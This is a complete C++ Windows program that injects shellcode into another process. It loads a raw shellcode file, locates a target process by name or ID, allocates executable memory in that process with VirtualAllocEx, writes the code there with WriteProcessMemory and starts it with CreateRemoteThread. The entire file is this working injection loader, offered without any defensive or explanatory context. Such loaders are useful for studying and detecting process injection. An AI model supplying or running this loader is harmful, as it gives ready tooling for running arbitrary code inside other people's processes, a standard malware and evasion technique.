#include <Windows.h>
#include <tlhelp32.h>

#include <iostream>
#include <string>
#include <vector>

#define REPORT_AND_RETURN_LAST_ERROR(message) \
    std::cout << message << ": " << GetLastError() << std::endl; \
    return GetLastError()

DWORD GetProcessIdByName(const std::wstring & processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &processEntry)) {
            do {
                if (processName == processEntry.szExeFile) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &processEntry));
        }

        CloseHandle(hSnapshot);
    }

    return processId;
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3) {
        std::cout << "Path to shellcode binary file and process name / ID required "
            "as command line parameters" << std::endl;
        return 1;
    }

    std::wstring shellcodePath = argv[1];

    unsigned long pid = std::wcstoul(argv[2], nullptr, 10);
    if (pid == 0 || pid == ULONG_MAX) {
        pid = GetProcessIdByName(argv[2]);
    }

    std::cout << "Using pid: " << pid << std::endl;

    if (pid == 0) {
        std::wcout << "Failed to find process: " << argv[2] << std::endl;
        return 1;
    }

    const auto shellcodeFileHandle = CreateFileW(
        shellcodePath.c_str(),
        GENERIC_ALL, 
        0, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
    if (!shellcodeFileHandle) {
        REPORT_AND_RETURN_LAST_ERROR("Failed to open shellcode file");
    }

    DWORD fileSize = GetFileSize(shellcodeFileHandle, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(shellcodeFileHandle);
        REPORT_AND_RETURN_LAST_ERROR("Failed to get file size");
    }

    std::cout << "Shellcode file size: " << fileSize << " B" << std::endl;
    std::vector<unsigned char> shellcodeBuffer(fileSize, 0);

    DWORD bytesRead = 0;
    auto success = ReadFile(
        shellcodeFileHandle, 
        shellcodeBuffer.data(), 
        fileSize, 
        &bytesRead, 
        NULL);

    CloseHandle(shellcodeFileHandle);

    if (!success) {
        REPORT_AND_RETURN_LAST_ERROR("Failed to read file");
    }

    if (bytesRead != fileSize) {
        std::cout << "Read unexpected number of bytes" << std::endl;
        std::cout << "Read  : " << bytesRead << std::endl;
        std::cout << "Actual: " << fileSize << std::endl;
        return 1;
    }

    shellcodeBuffer.resize(fileSize);

    std::cout << "Shellcode loaded in local memory (size: " 
        << shellcodeBuffer.size() << " B)" << std::endl;

    const auto processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!processHandle) {
        REPORT_AND_RETURN_LAST_ERROR("Failed to open process");
    }

    std::cout << "Target process opened" << std::endl;

    const auto remoteBuffer = VirtualAllocEx(
        processHandle, 
        NULL, 
        shellcodeBuffer.size(), 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(processHandle);
        REPORT_AND_RETURN_LAST_ERROR("Failed to allocate memory in process");
    }

    std::cout << "Memory allocated for shellcode at address: 0x" 
        << std::hex << remoteBuffer << std::endl;
    std::cout << "Size of allocation: " << std::dec 
        << shellcodeBuffer.size() << " B" << std::endl;

    success = WriteProcessMemory(
        processHandle,
        remoteBuffer,
        shellcodeBuffer.data(), 
        shellcodeBuffer.size(), 
        NULL);
    if (!success) {
        CloseHandle(processHandle);
        REPORT_AND_RETURN_LAST_ERROR("Failed to write memory");
    }

    std::cout << "Shellcode written to target process memory" << std::endl;
    std::cout << "Spawning remote thread..." << std::endl;

    const auto remoteThread = CreateRemoteThread(
        processHandle, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)remoteBuffer, 
        NULL,
        0, NULL);
    if (!remoteThread) {
        CloseHandle(processHandle);
        REPORT_AND_RETURN_LAST_ERROR("Failed to create remote thread");
    }

    std::cout << "Shellcode executed" << std::endl;
    std::cout << "Awaiting thread termination..." << std::endl;

    WaitForSingleObject(remoteThread, INFINITE);

    std::cout << "Remote thread finished !" << std::endl;

    // Get the exit code of the thread
    DWORD exitCode = 0;
    if (GetExitCodeThread(remoteThread, &exitCode)) {
        std::cout << "Shellcode thread exit code: 0x" 
            << std::hex << exitCode << std::endl;
    }
    else {
        std::cout << "Failed to get thread exit code: " 
            << GetLastError() << std::endl;
    }

    CloseHandle(remoteThread);
    CloseHandle(processHandle);

    std::cout << "Done" << std::endl;

    return 0;
}